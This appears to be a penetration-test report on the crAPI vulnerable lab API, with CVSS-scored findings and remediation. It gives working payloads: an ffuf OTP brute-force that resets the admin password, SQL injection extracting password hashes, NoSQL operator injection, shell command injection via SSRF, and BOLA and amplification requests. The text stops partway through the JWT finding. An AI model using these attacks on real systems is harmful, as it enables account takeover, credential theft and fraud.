# API Security Assessment Report

**Target Application:** crAPI Lab Instance — `http://localhost:8888` (microservices: `crapi-identity`, `crapi-community`, `crapi-workshop`)

**Assessment Type:** Authenticated black-box API penetration test

**Methodology:** OWASP API Security Top 10 (2023), manual request manipulation via Burp Suite (Repeater, Autorize/Autorizer extension, JWT Editor), `ffuf`, `sqlmap`

**Testing Window:** 13 Sep 2026 – 27 Oct 2026

**Document Classification:** PUBLIC — REDACTED

**Author:** Siwakhile Motsa

> **Redaction note:** All JWTs, bearer tokens, session cookies, password hashes, and full card numbers in this document have been truncated or replaced with `[REDACTED]`. Names, email addresses, phone numbers, VINs, coordinates, and other identifying test data are replaced with consistent placeholders for public sharing.

## API Reconnaissance

Initial reconnaissance was performed to identify the application's exposed API surface and understand its functionality before vulnerability testing.

This included:

- Identifying API endpoints and their associated HTTP methods.
- Examining request and response structures, including parameters and accepted input.
- Identifying authentication requirements and access-control behaviour.
- Mapping endpoints to their respective microservices.
- Identifying application functionality and potential areas for further testing.

Endpoint discovery and request analysis were conducted using Burp Suite and ffuf, alongside manual interaction with the application.

The information gathered during this phase informed subsequent vulnerability testing and helped identify potential attack paths across the application's microservices.

---

# Part 1 — Executive Summary

## 1.1 Overview

This assessment examined the three core microservices of the target API platform (identity, community/forum, and workshop/shop). Testing identified **17 distinct findings**, several of which are **not independent bugs but links in exploitable attack chains**. Depending on the endpoint, an attacker may need no authentication or only a standard user account. The demonstrated issues include unauthorized access to customer order and payment metadata, disclosure of vehicle locations, administrator-dashboard impersonation, store-credit fraud, and chained command injection against an internal microservice.

The demonstrated impact includes sensitive-data exposure, account takeover, business-logic abuse, and command execution in the tested lab environment. CVSS v4.0 Base-only (CVSS-B) numerical scores, severity ratings, and vectors are provided below.

## 1.2 CVSS v4.0 Base Score Summary

Scores below are **CVSS-B (Base-only) scores**, calculated from the vectors shown. The scoring is limited to impacts  demonstrated in the lab evidence; it does not assume untested administrative actions, arbitrary file access, database modification, service-wide disruption, or organisation-specific security requirements and deployment conditions. Threat and Environmental metrics are excluded from the reported scores. F-17 is not independently scored because the lab evidence does not demonstrate a standalone C/I/A impact from CORS alone.

> **Note:** As this assessment was conducted against a lab environment rather than a specific organisation's production deployment, scoring is limited to impacts demonstrated through lab evidence.

| ID | Finding | CVSS-B 4.0 | Severity | CVSS v4.0 vector |
|---|---|---:|---|---|
| F-02 | OTP Brute Force → Administrator Account Takeover | **9.3** | Critical | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| F-15 | Unauthenticated Access to Order and Payment Records | **8.7** | High | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-01 | BOLA — Other Users’ Order and Payment Metadata | **7.1** | High | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-03 | BOLA — Other Users’ Vehicle GPS Location | **7.1** | High | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-04 | BOLA — Other Users’ Mechanic Reports | **7.1** | High | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-05 | Internal Conversion Parameter Disclosure | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-06 | Mass Assignment — Protected Conversion Parameter | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| F-07 | SSRF — Internal Conversion Endpoint Trigger | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:N/SI:L/SA:N` |
| F-08 | OS Command Injection — Chained RCE Primitive | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N` |
| F-09 | Forum Author Email and Vehicle-ID Exposure | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-10 | Missing Rate Limiting — Layer-7 DoS | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N` |
| F-11 | BFLA — Cross-Account Video Deletion | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| F-12 | Negative-Quantity Store-Credit Fraud | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| F-13 | NoSQL Injection — Coupon Enumeration | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-14 | SQL Injection — Limited Credential-Hash Disclosure | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-16 | JWT Algorithm Confusion — Administrator Dashboard Data Access | **5.3** | Medium | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| F-17 | Permissive CORS wildcard (no standalone impact demonstrated) | — | Not scored | Not independently scoreable |

The CVSS v4.0 qualitative scale is: Low 0.1–3.9, Medium 4.0–6.9, High 7.0–8.9, and Critical 9.0–10.0. F-08 is scored only for the demonstrated low availability impact of the injected delay; no file read/write or broader service outage was demonstrated. F-16 is scored only for the demonstrated administrator-dashboard data disclosure; no separate admin-only state-changing operation was documented. F-17 may compound F-16, but that combined effect is not scored a second time.

## 1.3 Business Impact

| Impact Area                    | Description                                                                                                                                                                                                                                             |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Data Breach / PII**          | Testing demonstrated unauthorized disclosure of customer emails, phone numbers, VINs, vehicle-location data, and masked payment metadata on specific endpoints. Bulk access to every customer was not established across all routes.                                                          |
| **Financial Fraud**            | The store checkout logic accepts negative quantities and allows repeated store-credit increases; coupon reuse was also observed.                                                                                                            |
| **Account Takeover / Impersonation** | The legacy OTP endpoint enabled an administrator password reset and subsequent login. Separately, JWT algorithm confusion enabled administrator-dashboard impersonation and disclosure of the dashboard response; no admin-only state-changing operation was documented for the JWT path.          |
| **Remote Code Execution Risk** | A chain combining excessive data exposure, mass assignment, SSRF, and OS command injection demonstrated command execution against an internal microservice through a time-based (`sleep`) side channel in the lab. |
| **Physical Safety**            | Live GPS coordinates of any customer's vehicle can be retrieved by an unrelated authenticated user, creating a stalking/physical-harm risk.                                                                                                             |
| **Availability**               | An insufficiently bounded outbound-request parameter allows a single authenticated user to trigger a service-availability failure under the tested conditions.                                                                                         |

## 1.4 Key Root Causes

1. **Missing or inconsistent object-level ownership checks** on multiple ID-based endpoints, including orders, vehicle location, and mechanic reports.
2. **No function-level authorization checks** — "admin" endpoints are reachable by any authenticated user who guesses the URL pattern.
3. **Server trusts client-supplied JSON wholesale** (mass assignment) instead of allow-listing writable fields.
4. **Authentication primitives are weak or inconsistently enforced**: a legacy unthrottled OTP endpoint remains live alongside the current one, some endpoints accept requests with no `Authorization` header or session cookie at all, and the JWT validation logic does not pin the expected signing algorithm.
5. **Unvalidated user input reaches SQL/NoSQL query construction and, ultimately, a server-side shell command**, with no input sanitization, parameterization, or output encoding at any of these layers.
6. **The mechanic API can reach at least one internal conversion endpoint** through an attacker-controlled URL, indicating insufficient restrictions on server-side outbound requests. Network-level segmentation should also be assessed.

## 1.5 Priority Remediation Roadmap

| Priority | Action | Addresses |
| --- | --- | --- |
| P0 — Immediate | Enforce RS256-only JWT verification and reject unexpected algorithms | F-16 |
| P0 — Immediate | Disable the vulnerable legacy OTP endpoint and enforce attempt limits on all OTP/reset flows | F-02 |
| P0 — Immediate | Require authentication by default on protected endpoints; explicitly allow only intended public routes | F-15 |
| P0 — Immediate | Enforce ownership checks on order, vehicle, and mechanic-report resources | F-01, F-03, F-04 |
| P0 — Immediate | Enforce administrator-role checks on every administrative operation | F-11 |
| P1 — This sprint | Replace unrestricted request-body binding with allow-listed writable fields | F-06 |
| P1 — This sprint | Validate order quantities as positive integers and correct credit calculation logic | F-12 |
| P1 — This sprint | Parameterize SQL queries and validate coupon input types before constructing database queries | F-13, F-14 |
| P1 — This sprint | Restrict outbound request destinations and enforce network-level isolation of internal services | F-07, F-08 |
| P1 — This sprint | Bound `number_of_repeats` and protect the mechanic endpoint against request amplification | F-10 |
| P2 — Next sprint | Remove internal implementation fields and unnecessary personal data from API responses | F-05, F-09 |
| P2 — Next sprint | Restrict CORS to required, trusted origins and verify browser-side security impact | F-17 |

The priority order is a proposed remediation order based on the demonstrated impact in this lab, not a claim that the controls have been independently validated in production.
---

# Part 2 — Technical Findings & Exploit Chains

> Requests/responses below are reproduced from testing notes. All bearer tokens are truncated to `eyJ...[REDACTED]`, card numbers were already masked by the application, and internal hostnames reflect the lab's docker-compose service names (`crapi-identity`).

## 2.1 Finding Index

| ID   | Title                                         |
| ---- | --------------------------------------------- |
| F-01 | BOLA — Orders Endpoint                        |
| F-02 | Broken Authentication — OTP Brute Force       |
| F-03 | BOLA — Vehicle Location                       |
| F-04 | BOLA — Mechanic Report                        |
| F-05 | Excessive Data Exposure — `conversion_params` |
| F-06 | Mass Assignment — `conversion_params`         |
| F-07 | SSRF — `mechanic_api` Field                   |
| F-08 | OS Command Injection — Chained RCE Primitive  |
| F-09 | Excessive Data Exposure — Forum Posts         |
| F-10 | Missing Rate Limiting — Layer-7 DoS           |
| F-11 | BFLA — Admin Video Deletion                   |
| F-12 | Improper Quantity Validation — Negative Quantity Fraud |
| F-13 | NoSQL Injection — Coupon Validation           |
| F-14 | SQL Injection — Coupon Field                  |
| F-15 | Unauthenticated Access — Orders Endpoint      |
| F-16 | JWT Algorithm Confusion                       |
| F-17 | Permissive CORS Policy                        |

---

### F-01 — BOLA: Read Any User's Order & Payment Data

> **Note:** This finding is a consequence of the vulnerability demonstrated in F-15 (Unauthenticated Access — Orders Endpoint). It is documented separately as a precaution, since remediation of F-15 alone may leave F-01 exploitable.

**Endpoint:** `GET /workshop/api/shop/orders/{id}`

**CVSS-B 4.0:** 7.1 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** Authenticate as any user, request your own order, then increment/decrement the numeric `{id}` path parameter.

```

GET /workshop/api/shop/orders/6

Authorization: Bearer eyJ...[REDACTED] (own account)

```

Returns the caller's own order (email `[TEST_USER_EMAIL]`).

```

GET /workshop/api/shop/orders/5

Authorization: Bearer eyJ...[REDACTED] (same token, unmodified)

```

```json

{

  "order": {"id":5,"user":{"email":"[ADMIN_EMAIL]","number":"[PHONE_NUMBER]"},

    "product":{"name":"Seat","price":"10.00"},"status":"delivered"},

  "payment": {"card_number":"XXXXXXXXXXXX3656","card_owner_name":"Admin",

    "card_type":"MasterCard","card_expiry":"10/2029"}

}

```

No ownership check was performed server-side — the token owner (`id:6`'s owner) was returned another user's full order **and payment metadata**, and critically, **the administrator's email address**, which becomes the input to F-02.

**Remediation:** On every object fetch, verify `order.user_id == token.subject_id` (or equivalent) before returning data; return `403`/`404` otherwise. Do not rely on the client to request only its own IDs.

---

### F-02 — Broken Authentication: OTP Brute Force → Account Takeover

**Endpoints:** `POST /identity/api/auth/v2/check-otp` (legacy, live), `POST /identity/api/auth/v3/check-otp` (current)

**CVSS-B 4.0:** 9.3 (Critical) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`

**Exploit:** The current `v3` OTP-check endpoint appears to apply a limit (confirmed `500` after invalid attempts), but a **legacy `v2` endpoint remains live, unthrottled, and accepts arbitrary attempt volume**.

```

POST /identity/api/auth/v2/check-otp

{"email":"[ADMIN_EMAIL]","otp":"0000","password":"[REDACTED_TEST_PASSWORD]"}  // invalid test OTP; not the discovered OTP

→ 500 {"message":"Invalid OTP! Please try again.."}

```

Brute forced with `ffuf` across the full 4-digit keyspace (10,000 values):

```

ffuf -u http://localhost:8888/identity/api/auth/v2/check-otp \\

  -w otp.txt -X POST -H "Content-Type: application/json" \\

  -d '{"email":"[ADMIN_EMAIL]","otp":"FUZZ","password":"Hacked!123"}' \\

  -fc 500

```

```

[REDACTED_OTP]   [Status: 200, Size: 39, ...]

:: Progress: [2765/10000] ...

```

A valid OTP (`[REDACTED_OTP]`) was found at request \~2,765 of 10,000, silently **resetting the admin password** to the attacker-chosen value. Login then succeeds:

```

POST /identity/api/auth/login

{"email":"[ADMIN_EMAIL]","password":"Hacked!123"}

→ 200 {"token":"eyJ...[REDACTED]","role":"admin"}

```

**Chain relevance:** This finding depends on knowing a valid target email. F-01's leaked `[ADMIN_EMAIL]` is what made this attack targeted rather than blind. See **Chain A** below.

**Remediation:** Remove/disable the legacy `v2` endpoint entirely. Apply per-account and per-IP rate limiting plus exponential lockout to all OTP/password-reset flows. Increase OTP length/entropy and expire OTPs after a small, fixed number of attempts (e.g., 5).

---

### F-03 — BOLA: Real-Time Vehicle GPS Location Disclosure

**Endpoint:** `GET /identity/api/v2/vehicle/{vehicleId}/location`

**CVSS-B 4.0:** 7.1 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** Swap the caller's own `vehicleId` for one belonging to another user (sourced from F-09):

```

GET /identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location

Authorization: Bearer eyJ...[REDACTED] (unrelated account)

→ 200

{"carId":"cd515c12-...","vehicleLocation":{"latitude":"[LATITUDE]","longitude":"[LONGITUDE]"},

 "fullName":"[USER_NAME]","email":"[USER_EMAIL]"}

```

Any authenticated user can obtain the live coordinates of any other user's vehicle.

**Remediation:** Verify the requesting user owns the vehicle/VIN before returning telemetry. Treat location data as sensitive — apply the same ownership check pattern as F-01.

---

### F-04 — BOLA: Cross-User Mechanic Report Disclosure

**Endpoint:** `GET /workshop/api/mechanic/mechanic_report?report_id={id}`

**CVSS-B 4.0:** 7.1 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** The report-link URL returned after submitting a mechanic request (`POST /workshop/api/merchant/contact_mechanic`) requires only a valid bearer token — not ownership of the report:

```

GET /workshop/api/mechanic/mechanic_report?report_id=3

Authorization: Bearer eyJ...[REDACTED] (unrelated account)

→ 200

{"vehicle":{"vin":"[VIN]","owner":{"email":"[USER_EMAIL]",

 "number":"[PHONE_NUMBER]"}},"problem_details":"[REDACTED VEHICLE DETAILS]"}

```

Sequential `report_id` enumeration discloses other customers' VIN, phone number, email, and free-text problem descriptions.

**Remediation:** Bind `report_id` lookups to the authenticated requester's own submissions (or to the assigned mechanic's identity), not to possession of a bearer token alone.

---

### F-05 — Excessive Data Exposure: Internal `conversion_params` Field

**Endpoint:** `GET /identity/api/v2/user/videos/{id}`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** A routine profile-video fetch returns an internal, server-controlled field never shown in the UI:

```json

{"id":52,"video_name":"Screen Recording ....mp4",

 "conversion_params":"-v codec h264",

 "profileVideo":"data:image/jpeg;base64,..."}

```

`conversion_params` appears to contain command-line arguments used by a server-side video-conversion process. Its significance becomes clear when combined with F-06 and the timing-based command-injection evidence in F-08.

**Remediation:** Apply response-level allow-listing (DTOs) so internal/implementation fields are never serialized into client-facing responses, regardless of what the ORM/ODM model contains.

---

### F-06 — Mass Assignment: Write to Protected `conversion_params` Field

**Endpoint:** `PUT /identity/api/v2/user/videos/{id}`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N`

**Exploit:** The field discovered in F-05 is also **writable**, despite never being exposed as an input in the legitimate UI:

Baseline:

```json

PUT /identity/api/v2/user/videos/52

{"videoName":"My video 0.mp4"}

→ 200 {"conversion_params":"-v codec h264", *...*}

```

Injected write:

```json

PUT /identity/api/v2/user/videos/52

{"videoName":"My video 0.mp4","conversion_params":"mass assignment test"}

→ 200 {"conversion_params":"mass assignment test", *...*}

```

A subsequent `GET` confirms the value persisted server-side, proving the endpoint binds the full request body to the underlying object rather than an allow-listed subset of fields.

**Remediation:** Bind only explicitly permitted fields (`videoName`) from the request body. Never let a request body `merge`/`save` directly into a persistence-layer entity.

---

### F-07 — SSRF: Internal Service Reachable via `mechanic_api` Field

**Endpoints:** `POST /workshop/api/merchant/contact_mechanic`, internal `GET /identity/api/v2/user/videos/convert_video`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:N/SI:L/SA:N`

**Exploit:** The internal video-conversion endpoint rejects direct external calls:

```

GET /identity/api/v2/user/videos/convert_video?video_id=52

→ 403 {"message":"This endpoint should be accessed only internally.",

 "endpoint_url":"http://crapi-identity:8080/identity/api/v2/user/videos/convert_video"}

```

The error message discloses the internal hostname and port for the conversion endpoint, which the `contact_mechanic` endpoint can reach through its **attacker-controlled callback URL** (`mechanic_api`), fetched server-side:

```json

POST /workshop/api/merchant/contact_mechanic

{"mechanic_code":"TRAC_JHN","vin":"[VIN]",

 "mechanic_api":"https://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id=52",

 "repeat_request_if_failed":false,"number_of_repeats":1}

→ 200 {"response_from_mechanic_api":{"message":"Video conversion command executed.","status":200}}

```

The backend treats `mechanic_api` as a blind outbound HTTP client with no destination allow-list, letting the attacker pivot from the public API gateway to an internal, otherwise-unreachable service — and trigger its video-conversion operation on demand. The score reflects only the demonstrated low integrity effect on that subsequent service.

**Remediation:** Validate/allow-list outbound destination hosts server-side (deny RFC1918/internal DNS names and cloud metadata ranges); do not let any internal-only endpoint be reachable merely by knowing its hostname — enforce network-layer segmentation (e.g., service mesh mTLS/network policies) in addition to the application-layer check.

---

### F-08 — OS Command Injection (Blind, Chained RCE Primitive)

**Endpoint:** `PUT /identity/api/v2/user/videos/{id}` (write) → triggered via `POST /workshop/api/merchant/contact_mechanic` (SSRF trigger)

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`

**Exploit:** Combining F-06 (mass assignment write) and F-07 (SSRF trigger), the `conversion_params` value is passed, unsanitized, to a server-side command/process invocation. A shell metacharacter (`;`) was appended to prove command chaining:

```json

PUT /identity/api/v2/user/videos/52

{"videoName":"My video 0.mp4","conversion_params":"-v codec h264; sleep 10"}

```

Baseline SSRF trigger (no injected sleep) — **405 ms** response time.

Trigger after injecting `; sleep 10` — **10,544 ms** response time.

Trigger after injecting `; sleep 25` — **25,667 ms** response time.

The observed delay tracks the injected `sleep` value almost exactly (Δt ≈ requested seconds), which is conclusive evidence of **blind OS command injection**: attacker-controlled input is concatenated into a shell command executed on the backend host. The score assigns only low availability impact for the demonstrated request-processing delay; no file read/write, data modification, or service-wide outage was demonstrated.

**Remediation:** Never construct shell command strings from user input. Use parameterized/argument-array process invocation (no shell interpolation), and in parallel remove the `conversion_params` write path entirely (see F-06) — it should never have been attacker-controlled in the first place.

---

### F-09 — Excessive Data Exposure: Forum Posts Leak Email + Vehicle ID

**Endpoint:** `GET /community/api/v2/community/posts/recent`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** A routine, low-privilege "recent forum posts" call returns full author objects including fields with no legitimate reason to be public:

```json

{"posts":[{"author":{"nickname":"[USER_NAME]","email":"[USER_EMAIL]",

 "vehicleid":"cd515c12-0fc1-48ae-8b61-9230b70a845b", *...*}}, *...*]}

```

Every post and comment author's email and internal `vehicleid` (a GUID used directly by F-03's location endpoint) is exposed to any authenticated forum reader.

**Remediation:** Return only a public-safe author projection (nickname, avatar) from social/community endpoints. Internal identifiers (`vehicleid`) should never be serialized to a public API response.

---

### F-10 — Missing Rate Limiting: Layer-7 Denial of Service

> **Note:** The Layer 7 DoS condition has been validated to the extent permitted by the lab environment. However, in a real-world assessment, the evidence obtained would not be sufficient to justify labelling this finding as a confirmed Layer 7 Denial of Service.

**Endpoint:** `POST /workshop/api/merchant/contact_mechanic`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`

**Exploit:** The `number_of_repeats` parameter is attacker-controlled and triggers that many outbound requests per call:

```json

{"mechanic_api":"http://localhost:8888/workshop/api/mechanic/receive_report",

 "repeat_request_if_failed":true,"number_of_repeats":100}

→ 200 (accepted)

```

```json

{"repeat_request_if_failed":true,"number_of_repeats":1000}

→ 503 {"message":"Service unavailable. Seems like you caused layer 7 DoS :)"}

```

A single authenticated request with an inflated `number_of_repeats` value was accepted at 100 repetitions. At 1,000 repetitions, the service returned HTTP 503 with an application-generated message identifying a Layer-7 DoS condition. This demonstrates an insufficiently bounded request-amplification parameter and a service-availability failure under the tested conditions. The extent and duration of impact on other users were not established.

> **Note:** In a real-world production environment, I would trigger the request amplification condition while monitoring service availability from a separate user account. If the service became unavailable or experienced significant degradation for that different user during the repeated requests, this would provide evidence that the condition causes a Layer 7 DoS affecting other users, rather than merely producing an error for the initiating request and user. The crAPI lab environment does not permit this level of validation, so the impact on other users could not be independently established.

**Remediation:** Cap and server-side-validate `number_of_repeats` (e.g., max 3–5); apply per-user/per-endpoint rate limiting and request-amplification protections independent of any single parameter.

---

### F-11 — BFLA: Standard User Reaches Admin-Only Video Deletion

**Endpoints:** `DELETE /identity/api/v2/user/videos/{id}` → `DELETE /identity/api/v2/admin/videos/{id}`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N`

**Exploit:**

```

DELETE /identity/api/v2/user/videos/52

Authorization: Bearer eyJ...[REDACTED] (standard user)

→ 403 {"message":"This is an admin function. Try to access the admin API"}

```

The error response **discloses the correct admin route**. Calling it directly with the same standard-user token succeeds:

```

DELETE /identity/api/v2/admin/videos/52

→ 200 {"message":"User video deleted successfully."}

```

Confirmed cross-account with a second test account's video ID (`104`):

```

DELETE /identity/api/v2/admin/videos/104

→ 200 {"message":"User video deleted successfully."}

```

A standard, non-privileged role can invoke an admin-restricted, destructive function and delete **any** user's video.

**Remediation:** Enforce role checks (`role == ADMIN`) server-side on every `/admin/\*` route regardless of how the caller discovered the path. Never leak the "real" privileged route in a 403 error body.

---

### F-12 — Improper Quantity Validation: Negative Quantity Enables Store-Credit Fraud

**Endpoint:** `POST /workshop/api/shop/orders`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N`

**Exploit:** The order-creation endpoint accepts negative quantities. The evidence demonstrates that repeated negative-quantity orders increase the credit balance; it does not show a protected field being overwritten, so this is classified as improper quantity validation/business-logic abuse rather than mass assignment:

The captured requests and responses establish one chronological sequence: the first `quantity: -1` request returned a balance of `120.0`; repeating the same request returned `130.0`; then `quantity: -2` returned `150.0`. This shows a $10 increase for each `-1` request and a $20 increase for the `-2` request, consistent with the stated $10 unit price:

```json

{"product_id":2,"quantity":-1} → 200 {"id":15,"message":"Order sent successfully.","credit":120.0}

{"product_id":2,"quantity":-1} → 200 {"id":16,"message":"Order sent successfully.","credit":130.0}

{"product_id":2,"quantity":-2} → 200 {"credit":150.0}

```

A follow-on test also showed `quantity:0` still creates a `"delivered"` order record (free product with no charge), confirmed via `GET /workshop/api/shop/orders/all`.

**Remediation:** Validate `quantity > 0` server-side (reject non-positive values) and derive price/credit calculations only from trusted catalog data, never from client-influenced arithmetic performed with unchecked input.

---

### F-13 — NoSQL Injection: Coupon Validation Endpoint

**Endpoint:** `POST /community/api/v2/coupon/validate-coupon`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** The `coupon_code` parameter accepts a raw JSON object instead of a string, which is passed directly into a MongoDB-style query:

```json

{"coupon_code":{ "$ne": "12345" }}

→ 200 {"coupon_code":"TRAC075","amount":"75", *...*}

```

```json

{"coupon_code":{ "$gt": "TRAC075" }}

→ 200 {"coupon_code":"TRAC125","amount":"125", *...*}

```

By manipulating query operators (`$ne`, `$gt`), coupon enumeration is possible without supplying a normal string coupon code, bypassing the intended "redeem a known code" business logic. The examples demonstrate returned coupon records, not exhaustive enumeration of every valid coupon in the database.

**Remediation:** Strictly type and validate request bodies (reject non-string `coupon_code`); use an ODM/driver configuration that disallows operator keys in user-supplied query filters (e.g., `mongo-sanitize`-style middleware), and enforce schema validation at the API boundary.

---

### F-14 — SQL Injection: Coupon Code Field (PostgreSQL)

**Endpoint:** `POST /workshop/api/shop/apply_coupon`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** Unlike F-13 (NoSQL, community service), the **workshop** service's coupon-apply endpoint is backed by PostgreSQL and is vulnerable to classic SQL injection via unescaped single quotes.

Baseline (already-claimed coupon):

```json

{"coupon_code":"TRAC065","amount":65}

→ 400 {"message":"TRAC065 Coupon code is already claimed by you!!..."}

```

Boolean-based probe:

```json

{"coupon_code":"TRAC065' OR '1'='1","amount":65}

→ 400 {"message":"TRAC075 Coupon code is already claimed by you!!..."}

```

The returned coupon code (`TRAC075`, not the submitted `TRAC065`) proves the injected `OR '1'='1'` altered the query's `WHERE` clause.

Automated confirmation with `sqlmap` identified four distinct, independently exploitable injection techniques on the same parameter:

```

Parameter: JSON coupon_code ((custom) POST)

  - boolean-based blind:  ... AND 9463=9463 AND ...

  - stacked queries:      ...';SELECT PG_SLEEP(5)--

  - time-based blind:     ... AND 7917=(SELECT 7917 FROM PG_SLEEP(5)) AND ...

  - UNION query (2 cols)

Back-end DBMS: PostgreSQL

```

Column enumeration against `public.applied_coupon` succeeded without prior schema knowledge:

```

| coupon_code | varchar |

| id          | int4    |

| user_id     | int4    |

```

A crafted `UNION`-based payload exfiltrated credentials directly into the application's own error response:

```json

{"coupon_code":"' AND 1=2 UNION SELECT email||':'||password FROM user_login LIMIT 5--","amount":100}

→ 400 {"message":"[ADMIN_EMAIL]:$2a$10$[REDACTED-BCRYPT-HASH] Coupon code is already claimed by you!!..."}

```

This demonstrates extraction of credential data from `user_login` through the SQL injection. The extent of accessible records was not fully established, including the **administrator's email and password hash**, and — via the stacked-query technique identified by `sqlmap` — a credible path to write/DoS primitives (`PG_SLEEP`, and by extension `INSERT`/`UPDATE`/`DELETE`) that was not exercised further to avoid destabilizing the lab database.

**Remediation:** Use parameterized queries / prepared statements for all database access — never concatenate or string-format user input into SQL. Disable stacked-query execution at the driver level if not explicitly required. Enforce least-privilege DB credentials for the application account (no `SELECT` access to `user_login` from the coupon service).

---

### F-15 — Unauthenticated Access: Orders Endpoint

> **Note:** F-15 exposes the endpoint without requiring authentication, effectively enabling exploitation of the BOLA vulnerability documented in F-01(BOLA: Read Any User's Order & Payment Data). The findings are documented separately because, as mentioned as a note at F-01, remediation of F-15 alone may leave F-01 exploitable by authenticated users.

**Endpoint:** `GET /workshop/api/shop/orders/{id}`

**CVSS-B 4.0:** 8.7 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** A Burp "Autorizer"-style differential scan (replaying every request with authorization headers stripped) flagged this endpoint as returning an **identical `200 OK` response with or without** the `Authorization` header:

```

GET /workshop/api/shop/orders/19

(no Authorization header, Cookie header also removed)

→ 200 {"order":{...},"payment":{"card_number":"XXXXXXXXXXXX0285", ...}}

```

The endpoint performs **no authentication check at all** (not even "is there a valid session"), let alone authorization. Combined with F-01's incrementing numeric IDs, this means **every order and payment record in the system can be scraped by a fully anonymous, unauthenticated party**.

**Remediation:** Apply authentication middleware globally by default (deny-by-default), with explicit opt-out only for intentionally public routes. Add automated differential (authenticated vs. unauthenticated) regression testing to CI for every API route.

---

### F-16 — JWT Algorithm Confusion → Administrator Dashboard Impersonation

**Endpoint tested:** `GET /identity/api/v2/user/dashboard`

**CVSS-B 4.0:** 5.3 (Medium) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

**Exploit:** The identity service issues RS256-signed JWTs and publishes its public key at `/.well-known/jwks.json`:

```

GET /.well-known/jwks.json

→ {"keys":[{"kty":"RSA","e":"AQAB","alg":"RS256","n":"[REDACTED-RSA-MODULUS]", ...}]}

```

